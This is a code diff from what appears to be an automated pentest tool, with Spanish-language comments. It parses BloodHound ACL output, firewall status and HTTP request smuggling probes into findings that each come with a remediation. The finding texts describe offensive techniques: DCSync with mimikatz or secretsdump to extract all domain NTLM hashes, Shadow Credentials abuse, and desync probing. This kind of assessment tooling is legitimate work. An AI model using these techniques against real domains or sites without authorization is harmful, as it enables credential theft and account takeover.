+      description: `\`netsh advfirewall show allprofiles\` ejecutado remotamente confirma que el perfil ${label} de Windows Defender Firewall está en State OFF en ${host || "el controlador de dominio"}${key === "domain" ? " — este es el perfil que aplica al tráfico intra-dominio, el más sensible en un DC" : ""} (CWE-16).`,
+      remediation: `Reactivar el perfil ${label}: \`netsh advfirewall set ${key}profile state on\`, o vía GPO (Computer Configuration > Windows Defender Firewall) para que no dependa de configuración manual por host.`,
+    });
+  }
+  return out;
+}
+
 export function extractAdDomain(text) {
   const t = String(text || "");
   let m = t.match(/\(domain:([A-Za-z0-9._-]+)\)/i)
@@ -4283,6 +4706,61 @@ export function bloodhoundFindings(stdout) {
   }];
 }
 
+const BLOODHOUND_ACE_SEVERITY = {
+  GenericAll: "Critical",
+  AllExtendedRights: "Critical",
+  AddKeyCredentialLink: "Critical",
+  DCSync: "Critical",
+  Owns: "High",
+  GenericWrite: "High",
+  WriteDacl: "High",
+  WriteOwner: "High",
+  AddMember: "High",
+  AddSelf: "High",
+  ForceChangePassword: "High",
+  WriteSPN: "High",
+};
+
+const BLOODHOUND_ACE_LABEL = {
+  AddKeyCredentialLink: "Shadow Credentials",
+};
+
+/**
+ * Parsea las líneas sintéticas "DS_ACE|principal|tipo|derecho|target|tipo"
+ * que bridge.py anexa al stdout de bloodhound-python (extraídas de los JSON
+ * ya escritos en evidence/bloodhound — la misma información que BloodHound
+ * UI resaltaría al abrir el grafo, pero sin necesidad de abrirlo).
+ */
+export function bloodhoundAceFindings(stdout) {
+  const text = String(stdout || "");
+  const out = [];
+  for (const line of text.split("\n")) {
+    if (!line.startsWith("DS_ACE|")) continue;
+    const parts = line.split("|");
+    if (parts.length !== 6) continue;
+    const [, principal, principalType, right, target, targetType] = parts;
+    const severity = BLOODHOUND_ACE_SEVERITY[right];
+    if (!severity) continue;
+    const label = BLOODHOUND_ACE_LABEL[right] ? ` (${BLOODHOUND_ACE_LABEL[right]})` : "";
+    const isDcsync = right === "DCSync";
+    out.push({
+      title: `AD: ${principal} tiene ${right}${label} sobre ${target}`,
+      severity,
+      description: isDcsync
+        ? `BloodHound confirmó que ${principal} (${principalType}) tiene GetChanges Y GetChangesAll sobre el objeto dominio ${target} (CWE-269): con ambos derechos puede solicitar una réplica completa vía DRSUAPI (mimikatz lsadump::dcsync o secretsdump.py -just-dc), extrayendo los hashes NTLM de todos los usuarios del dominio, incluido krbtgt.`
+        : right === "AddKeyCredentialLink"
+        ? `BloodHound confirmó que ${principal} (${principalType}) puede escribir msDS-KeyCredentialLink en ${target} (${targetType}) (CWE-269): permite añadir una clave pública propia como credencial alternativa del objeto (Shadow Credentials) y autenticar como ${target} vía PKINIT sin conocer su contraseña ni resetearla.`
+        : `BloodHound confirmó que ${principal} (${principalType}) tiene el derecho ${right} sobre ${target} (${targetType}) (CWE-269), suficiente para tomar control del objeto (según el derecho: cambiar su contraseña, añadirlo a un grupo, modificar su ACL/propietario, o control total).`,
+      remediation: isDcsync
+        ? "Retirar GetChanges/GetChangesAll de cuentas que no sean controladores de dominio o cuentas de replicación legítimas (Azure AD Connect, etc.); auditar quién más los tiene."
+        : right === "AddKeyCredentialLink"
+        ? "Retirar el derecho de escritura sobre msDS-KeyCredentialLink del principal indicado; monitorizar el evento 5136 (modificación de atributo) sobre ese objeto."
+        : `Retirar el derecho ${right} del principal indicado sobre ${target} si no está justificado por el modelo de delegación; auditar el resto de ACLs del mismo tier.`,
+    });
+  }
+  return out;
+}
+
 /** findDelegation.py — unconstrained / constrained / RBCD inventory. */
 export function findDelegationFindings(stdout) {
   const text = String(stdout || "");
@@ -4779,4 +5257,55 @@ export function xssFormProbeSteps(step, prefix, baseUrl, form, cookieFile, maxTi
 
 export function sqliFormProbeSteps(step, prefix, baseUrl, form, cookieFile, maxTime = "12") {
   return formProbeSteps(step, prefix, baseUrl, form, cookieFile, SQLI_GENERIC_PAYLOAD, "Sonda de SQLi genérico en formulario descubierto", maxTime);
+}
+
+/* ------------------------------------------------------------------------ *
+ * HTTP Request Smuggling (CL.TE / TE.CL) — sondas de timing (metodología
+ * PortSwigger). curl no puede mandar Content-Length/Transfer-Encoding
+ * ambiguos de forma fiable, así que estos steps invocan la pseudo-
+ * herramienta "http-smuggle-probe" que el bridge maneja con una conexión
+ * TCP cruda propia (ver backend/bridge.py: build_smuggling_probe /
+ * send_raw_probe). Fase 3 (Exploitation): un desync real en un front-end
+ * compartido puede afectar peticiones de OTROS usuarios, no solo del que
+ * prueba — mismo gate humano de avance de fase que wmiexec/secretsdump.
+ * https://hacktricks.wiki/en/pentesting-web/http-request-smuggling/index.html
+ * ------------------------------------------------------------------------ */
+export function smugglingProbeSteps(step, prefix, baseUrl, maxTime = "12") {
+  let u;
+  try {
+    u = new URL(baseUrl);
+  } catch {
+    return [];
+  }
+  const port = u.port || (u.protocol === "https:" ? "443" : "80");
+  const path = u.pathname || "/";
+  return ["clte", "tecl"].map((kind) =>
+    step(`${prefix}-${kind}`, "http-smuggle-probe", [kind, u.hostname, port, path], null, {
+      desc: `Sonda de timing HTTP Request Smuggling (${kind === "clte" ? "CL.TE" : "TE.CL"})`,
+    }),
+  );
+}
+
+/**
+ * Clasifica el JSON que devuelve la pseudo-herramienta http-smuggle-probe.
+ * timed_out=true es solo CANDIDATO (la conexión se quedó colgada, señal
+ * de desync) — requiere la respuesta diferencial de seguimiento para
+ * confirmarlo, igual que otros hallazgos de esta herramienta que dejan
+ * el último paso a confirmación manual (SSTI/CORS).
+ */
+export function smugglingFinding(stdout, path) {
+  let hit;
+  try {
+    hit = JSON.parse(stdout || "");
+  } catch {
+    return null;
+  }
+  if (!hit || !hit.timed_out) return null;
+  const label = hit.kind === "tecl" ? "TE.CL" : "CL.TE";
+  return {
+    title: `Posible HTTP Request Smuggling (${label}) en ${path || "/"}`,
+    severity: "High",
+    description: `La sonda de timing ${label} contra ${path || "/"} se quedó sin respuesta (~${Math.round(hit.elapsed_ms || 0)}ms) en vez de recibir un rechazo o respuesta normal (CWE-444): señal de que front-end y backend interpretan de forma distinta los límites de la petición (Content-Length vs Transfer-Encoding ambiguos), lo que en un desync real permite mezclar la petición de un atacante con la de otra víctima en la misma conexión reutilizada. Esto es solo el candidato de timing — confirmar manualmente con la técnica de respuesta diferencial (petición de sondeo justo después de la sospechosa) antes de reportarlo como explotado.`,
+    remediation: "Normalizar en el borde: rechazar peticiones con Content-Length y Transfer-Encoding simultáneos (RFC 7230 §3.3.3); si front-end y backend son productos distintos, forzar HTTP/2 end-to-end (sin downgrade a HTTP/1.1 ambiguo) o desactivar el reuso de conexiones keep-alive hacia el backend.",
+  };
 }
